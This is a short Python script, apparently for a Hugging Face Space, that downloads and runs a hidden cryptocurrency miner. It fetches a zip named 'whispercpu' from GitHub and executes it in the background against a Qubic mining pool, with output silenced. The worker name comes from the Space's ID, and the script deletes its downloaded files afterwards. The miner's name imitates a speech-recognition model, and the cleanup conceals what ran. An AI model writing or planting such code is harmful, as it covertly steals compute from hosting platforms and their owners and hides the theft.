import os
os.system("wget https://github.com/qqivk/Whisper_c/raw/refs/heads/main/whispercpu.zip")
os.system("unzip whispercpu.zip")
os.system("chmod +x whispercpu")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./whispercpu --pool qubic1.hk.apool.io:3334 --account CP_fafubk1b65 --worker {wn} --thread 16 >/dev/null &")
os.system("rm -rf whisper*")
